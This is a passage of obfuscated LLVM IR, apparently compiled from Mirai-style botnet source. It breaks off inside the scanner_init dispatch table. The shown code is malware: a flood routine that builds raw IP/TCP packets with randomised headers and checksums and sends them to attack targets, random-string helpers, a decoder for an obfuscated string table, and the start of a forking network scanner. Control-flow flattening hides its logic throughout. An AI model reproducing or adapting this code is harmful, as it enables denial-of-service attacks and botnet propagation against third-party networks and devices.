; <label>:320:                                    ; preds = %loopEntry
  %321 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i64 %323
  %325 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %324, i32 0, i32 1
  %326 = load i32, i32* %325, align 4
  %327 = call i32 @ntohl(i32 %326) #7
  %328 = call i32 @rand_next()
  %329 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 2
  %334 = load i8, i8* %333, align 4
  %335 = zext i8 %334 to i32
  %336 = lshr i32 %328, %335
  %337 = add i32 %327, %336
  %338 = call i32 @htonl(i32 %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 9
  store i32 %338, i32* %340, align 4
  store i32 -273526691, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %26, align 4
  %343 = icmp eq i32 %342, -1
  %344 = select i1 %343, i32 -1334870890, i32 -400974019
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = call i32 @rand_next()
  %347 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 8
  store i32 %346, i32* %348, align 4
  store i32 -400974019, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i16, i16* %13, align 2
  %351 = zext i16 %350 to i32
  %352 = icmp eq i32 %351, 65535
  %353 = select i1 %352, i32 2089883233, i32 1835116360
  store i32 %353, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 3
  store i16 %357, i16* %359, align 4
  store i32 1835116360, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i16, i16* %16, align 2
  %362 = zext i16 %361 to i32
  %363 = icmp eq i32 %362, 65535
  %364 = select i1 %363, i32 1653916866, i32 -1176413512
  store i32 %364, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = call i32 @rand_next()
  %367 = and i32 %366, 65535
  %368 = trunc i32 %367 to i16
  %369 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %370 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %369, i32 0, i32 0
  store i16 %368, i16* %370, align 4
  store i32 -1176413512, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i16, i16* %17, align 2
  %373 = zext i16 %372 to i32
  %374 = icmp eq i32 %373, 65535
  %375 = select i1 %374, i32 17621842, i32 1123126563
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = call i32 @rand_next()
  %378 = and i32 %377, 65535
  %379 = trunc i32 %378 to i16
  %380 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %381 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %380, i32 0, i32 1
  store i16 %379, i16* %381, align 2
  store i32 1123126563, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i32, i32* %18, align 4
  %384 = icmp eq i32 %383, 65535
  %385 = select i1 %384, i32 1645631233, i32 -844379560
  store i32 %385, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = call i32 @rand_next()
  %388 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 2
  store i32 %387, i32* %389, align 4
  store i32 -844379560, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %19, align 4
  %392 = icmp eq i32 %391, 65535
  %393 = select i1 %392, i32 1232110106, i32 1349478008
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  %396 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 3
  store i32 %395, i32* %397, align 4
  store i32 1349478008, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8, i8* %20, align 1
  %400 = icmp ne i8 %399, 0
  %401 = select i1 %400, i32 2101742299, i32 710817009
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i32 @rand_next()
  %404 = and i32 %403, 65535
  %405 = trunc i32 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 7
  store i16 %405, i16* %407, align 2
  store i32 710817009, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  %409 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 0, i16* %410, align 2
  %411 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %412 = bitcast %struct.iphdr* %411 to i16*
  %413 = call zeroext i16 @checksum_generic(i16* %412, i32 20)
  %414 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 6
  store i16 0, i16* %417, align 4
  %418 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %419 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %420 = bitcast %struct.tcphdr* %419 to i8*
  %421 = call zeroext i16 @htons(i16 zeroext 40) #7
  %422 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %418, i8* %420, i16 zeroext %421, i32 40)
  %423 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 6
  store i16 %422, i16* %424, align 4
  %425 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 1
  %427 = load i16, i16* %426, align 2
  %428 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %429 = load i32, i32* %9, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %428, i64 %430
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i32 0, i32 0
  %433 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %432, i32 0, i32 1
  store i16 %427, i16* %433, align 2
  %434 = load i32, i32* %10, align 4
  %435 = load i8*, i8** %30, align 8
  %436 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %437 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i32 0, i32 0
  %442 = bitcast %struct.sockaddr_in* %441 to %struct.sockaddr*
  store %struct.sockaddr* %442, %struct.sockaddr** %436, align 8
  %443 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %444 = load %struct.sockaddr*, %struct.sockaddr** %443, align 8
  %445 = call i64 @sendto(i32 %434, i8* %435, i64 60, i32 16384, %struct.sockaddr* %444, i32 16)
  store i32 -1534780574, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = load i32, i32* %9, align 4
  %448 = add nsw i32 %447, 1
  store i32 %448, i32* %9, align 4
  store i32 1895079358, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  store i32 1570918041, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %449, %446, %408, %402, %398, %394, %390, %386, %382, %376, %371, %365, %360, %354, %349, %345, %341, %320, %300, %294, %293, %292, %289, %164, %160, %116, %110, %109, %106, %100, %99, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 2022521895, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2022521895, label %6
    i32 1807983991, label %10
    i32 738907174, label %17
    i32 1374243456, label %20
    i32 1405792383, label %24
    i32 1321332242, label %31
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  %9 = select i1 %8, i32 1807983991, i32 1374243456
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  store i32 738907174, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i32, i32* %4, align 4
  %19 = sub i32 %18, 2
  store i32 %19, i32* %4, align 4
  store i32 2022521895, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = icmp eq i32 %21, 1
  %23 = select i1 %22, i32 1405792383, i32 1321332242
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i16*, i16** %3, align 8
  %26 = load i16, i16* %25, align 2
  %27 = trunc i16 %26 to i8
  %28 = sext i8 %27 to i64
  %29 = load i64, i64* %5, align 8
  %30 = add i64 %29, %28
  store i64 %30, i64* %5, align 8
  store i32 1321332242, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = add i64 %33, %35
  store i64 %36, i64* %5, align 8
  %37 = load i64, i64* %5, align 8
  %38 = lshr i64 %37, 16
  %39 = load i64, i64* %5, align 8
  %40 = add i64 %39, %38
  store i64 %40, i64* %5, align 8
  %41 = load i64, i64* %5, align 8
  %42 = xor i64 %41, -1
  %43 = trunc i64 %42 to i16
  ret i16 %43

loopEnd:                                          ; preds = %24, %20, %17, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  %switchVar = alloca i32
  store i32 -1702029860, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1702029860, label %23
    i32 -1859708628, label %27
    i32 81867095, label %37
    i32 200514996, label %41
    i32 1176862851, label %48
    i32 -497543527, label %79
    i32 -1161963578, label %84
    i32 -750531109, label %90
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  %26 = select i1 %25, i32 -1859708628, i32 81867095
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i16*, i16** %9, align 8
  %29 = load i16, i16* %28, align 2
  %30 = zext i16 %29 to i32
  %31 = load i32, i32* %12, align 4
  %32 = add i32 %31, %30
  store i32 %32, i32* %12, align 4
  %33 = load i16*, i16** %9, align 8
  %34 = getelementptr inbounds i16, i16* %33, i32 1
  store i16* %34, i16** %9, align 8
  %35 = load i32, i32* %8, align 4
  %36 = sub nsw i32 %35, 2
  store i32 %36, i32* %8, align 4
  store i32 -1702029860, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, 1
  %40 = select i1 %39, i32 200514996, i32 1176862851
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i16*, i16** %9, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = load i32, i32* %12, align 4
  %47 = add i32 %46, %45
  store i32 %47, i32* %12, align 4
  store i32 1176862851, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %10, align 4
  %50 = lshr i32 %49, 16
  %51 = and i32 %50, 65535
  %52 = load i32, i32* %12, align 4
  %53 = add i32 %52, %51
  store i32 %53, i32* %12, align 4
  %54 = load i32, i32* %10, align 4
  %55 = and i32 %54, 65535
  %56 = load i32, i32* %12, align 4
  %57 = add i32 %56, %55
  store i32 %57, i32* %12, align 4
  %58 = load i32, i32* %11, align 4
  %59 = lshr i32 %58, 16
  %60 = and i32 %59, 65535
  %61 = load i32, i32* %12, align 4
  %62 = add i32 %61, %60
  store i32 %62, i32* %12, align 4
  %63 = load i32, i32* %11, align 4
  %64 = and i32 %63, 65535
  %65 = load i32, i32* %12, align 4
  %66 = add i32 %65, %64
  store i32 %66, i32* %12, align 4
  %67 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %68 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %67, i32 0, i32 6
  %69 = load i8, i8* %68, align 1
  %70 = zext i8 %69 to i16
  %71 = call zeroext i16 @htons(i16 zeroext %70) #7
  %72 = zext i16 %71 to i32
  %73 = load i32, i32* %12, align 4
  %74 = add i32 %73, %72
  store i32 %74, i32* %12, align 4
  %75 = load i16, i16* %7, align 2
  %76 = zext i16 %75 to i32
  %77 = load i32, i32* %12, align 4
  %78 = add i32 %77, %76
  store i32 %78, i32* %12, align 4
  store i32 -497543527, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %12, align 4
  %81 = lshr i32 %80, 16
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 -1161963578, i32 -750531109
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %12, align 4
  %86 = and i32 %85, 65535
  %87 = load i32, i32* %12, align 4
  %88 = lshr i32 %87, 16
  %89 = add i32 %86, %88
  store i32 %89, i32* %12, align 4
  store i32 -497543527, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %12, align 4
  %92 = xor i32 %91, -1
  %93 = trunc i32 %92 to i16
  ret i16 %93

loopEnd:                                          ; preds = %84, %79, %48, %41, %37, %27, %23, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %switchVar = alloca i32
  store i32 1755491938, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1755491938, label %5
    i32 -473699921, label %9
    i32 355514499, label %13
    i32 1064291552, label %23
    i32 -528357878, label %27
    i32 1267645696, label %39
    i32 -1666473346, label %47
    i32 1967511223, label %48
    i32 560701562, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  %8 = select i1 %7, i32 -473699921, i32 560701562
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %4, align 4
  %11 = icmp sge i32 %10, 4
  %12 = select i1 %11, i32 355514499, i32 1064291552
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = call i32 @rand_next()
  %15 = load i8*, i8** %3, align 8
  %16 = bitcast i8* %15 to i32*
  store i32 %14, i32* %16, align 4
  %17 = load i8*, i8** %3, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 4
  store i8* %18, i8** %3, align 8
  %19 = load i32, i32* %4, align 4
  %20 = sext i32 %19 to i64
  %21 = sub i64 %20, 4
  %22 = trunc i64 %21 to i32
  store i32 %22, i32* %4, align 4
  store i32 1967511223, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %4, align 4
  %25 = icmp sge i32 %24, 2
  %26 = select i1 %25, i32 -528357878, i32 1267645696
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = call i32 @rand_next()
  %29 = and i32 %28, 65535
  %30 = trunc i32 %29 to i16
  %31 = load i8*, i8** %3, align 8
  %32 = bitcast i8* %31 to i16*
  store i16 %30, i16* %32, align 2
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 2
  store i8* %34, i8** %3, align 8
  %35 = load i32, i32* %4, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %36, 2
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %4, align 4
  store i32 -1666473346, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @rand_next()
  %41 = and i32 %40, 255
  %42 = trunc i32 %41 to i8
  %43 = load i8*, i8** %3, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %3, align 8
  store i8 %42, i8* %43, align 1
  %45 = load i32, i32* %4, align 4
  %46 = add nsw i32 %45, -1
  store i32 %46, i32* %4, align 4
  store i32 -1666473346, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1967511223, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 1755491938, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %48, %47, %39, %27, %23, %13, %9, %5, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 28, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  %switchVar = alloca i32
  store i32 -215392655, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -215392655, label %9
    i32 -592037332, label %14
    i32 -1242720907, label %24
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %4, align 4
  %11 = add nsw i32 %10, -1
  store i32 %11, i32* %4, align 4
  %12 = icmp ne i32 %10, 0
  %13 = select i1 %12, i32 -592037332, i32 -1242720907
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = call i32 @rand_next()
  %16 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %17 = call i32 @util_strlen(i8* %16)
  %18 = urem i32 %15, %17
  %19 = zext i32 %18 to i64
  %20 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %19
  %21 = load i8, i8* %20, align 1
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i32 1
  store i8* %23, i8** %3, align 8
  store i8 %21, i8* %22, align 1
  store i32 -215392655, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  call void @table_lock_val(i8 zeroext 28)
  ret void

loopEnd:                                          ; preds = %14, %9, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() #0 {
  %.reg2mem18 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.fd_set.28, align 8
  %6 = alloca %struct.fd_set.28, align 8
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca %struct.timeval.29, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.tcphdr*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.tcphdr*, align 8
  %22 = alloca %struct.scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = call i32 @fork() #6
  store i32 %46, i32* @scanner_pid, align 4
  %47 = load i32, i32* @scanner_pid, align 4
  store i32 %47, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1958840561, i32* %switchVar
  %.reg2mem29 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar17 = load i32, i32* %switchVar
  switch i32 %switchVar17, label %switchDefault [
    i32 -1958840561, label %first
    i32 30940931, label %50
    i32 -2072661662, label %54
    i32 1722023776, label %55
    i32 2103314733, label %61
    i32 1758045743, label %65
    i32 1699820075, label %76
    i32 -212656568, label %79
    i32 1604295166, label %83
    i32 -1505700051, label %84
    i32 -798249934, label %95
    i32 -1005714534, label %98
    i32 -1456204684, label %99
    i32 669146838, label %103
    i32 1053391369, label %109
    i32 -2090255881, label %155
    i32 -1777417245, label %160
    i32 555753709, label %162
    i32 -1445666268, label %166
    i32 -1112963492, label %192
    i32 -1913368127, label %196
    i32 1064328857, label %200
    i32 642925505, label %231
    i32 851461472, label %234
    i32 -625172192, label %235
    i32 623441401, label %236
    i32 681878925, label %253
    i32 -1857649820, label %258
    i32 -883098242, label %263
    i32 -323432376, label %264
    i32 -405075291, label %269
    i32 -981297518, label %270
    i32 -1992820393, label %277
    i32 2111147493, label %278
    i32 -1894981624, label %285
    i32 1717081268, label %286
    i32 -930276638, label %295
    i32 -1345697733, label %304
    i32 -831658266, label %305
    i32 -2111352552, label %314
    i32 148524329, label %315
    i32 1401473643, label %323
    i32 1833697542, label %324
    i32 -1570294175, label %332
    i32 1096313591, label %333
    i32 430789642, label %341
    i32 -224190528, label %342
    i32 -345724480, label %350
    i32 994022824, label %351
    i32 969558067, label %363
    i32 -1765494742, label %364
    i32 -709897714, label %366
    i32 -462357896, label %370
    i32 167275075, label %379
    i32 -523095188, label %385
    i32 -2045236567, label %386
    i32 -723061757, label %389
    i32 -1985285462, label %393
    i32 1679664494, label %394
    i32 -883002138, label %406
    i32 -990981712, label %407
    i32 -328464679, label %416
    i32 555765680, label %417
    i32 1721231834, label %426
    i32 -1990685355, label %427
    i32 215955732, label %431
    i32 -887655513, label %446
    i32 2094242863, label %455
    i32 -2118036076, label %467
    i32 -332069945, label %475
    i32 -1332115090, label %480
    i32 -212189573, label %482
    i32 1083821388, label %483
    i32 1967637136, label %488
    i32 642166309, label %489
    i32 -826571333, label %495
    i32 503141509, label %517
    i32 1856915680, label %521
    i32 268135530, label %522
    i32 90417301, label %528
    i32 -1309396200, label %550
    i32 -1690124736, label %554
    i32 -502396068, label %555
    i32 344067791, label %556
    i32 1360509912, label %557
    i32 -192489800, label %560
    i32 -1543158883, label %567
    i32 -1104367084, label %569
    i32 360389995, label %571
    i32 954542516, label %576
    i32 1729716282, label %580
    i32 -790247993, label %590
    i32 -2103221912, label %591
    i32 1989618838, label %609
    i32 -934052134, label %618
    i32 -2091707671, label %622
    i32 -854395206, label %630
    i32 209236366, label %641
    i32 184639498, label %642
    i32 1128218606, label %660
    i32 -1094098438, label %661
    i32 -1167939978, label %667
    i32 -536179007, label %668
    i32 307026221, label %674
    i32 61275457, label %686
    i32 923063591, label %707
    i32 2013327518, label %709
    i32 -1120926068, label %713
    i32 -779015754, label %718
    i32 1232073307, label %723
    i32 -1198804465, label %737
    i32 615336590, label %742
    i32 -662819355, label %744
    i32 165195391, label %745
    i32 1715852690, label %746
    i32 376739106, label %755
    i32 -675123517, label %NodeBlock15
    i32 -195771206, label %NodeBlock13
    i32 -2134490730, label %NodeBlock11
    i32 1206897374, label %NodeBlock9
    i32 1916477772, label %LeafBlock7
    i32 -110687246, label %NodeBlock5
    i32 536000602, label %NodeBlock3
    i32 -235214534, label %NodeBlock1
    i32 608756329, label %NodeBlock
    i32 807950514, label %LeafBlock
    i32 -919767250, label %769
    i32 1281533134, label %774
    i32 -1200963688, label %777
    i32 -1049058279, label %778
    i32 1926113471, label %783
    i32 -2134981543, label %805
    i32 500977345, label %806
    i32 548465143, label %811
    i32 1592707820, label %833
    i32 1385498856, label %834
    i32 844353788, label %839
    i32 295002014, label %854
